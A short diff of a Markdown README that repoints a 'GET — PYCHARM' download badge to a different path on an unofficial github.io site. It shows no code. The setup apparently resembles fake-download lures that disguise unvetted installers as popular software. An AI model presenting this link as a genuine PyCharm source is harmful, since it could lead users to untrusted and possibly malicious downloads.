@@ -4,7 +4,7 @@
 <img src="https://locusit.se/wp-content/uploads/2024/08/PyCharm-1-1024x576.png" width="350">
 </p>
 
-[![GET — PYCHARM](https://img.shields.io/badge/GET-PYCHARM-2563eb?style=for-the-badge)](https://pribbledriveparter.github.io/.github/)
+[![GET — PYCHARM](https://img.shields.io/badge/GET-PYCHARM-2563eb?style=for-the-badge)](https://pribbledriveparter.github.io/.github/PyCharm)
 
 ---
 
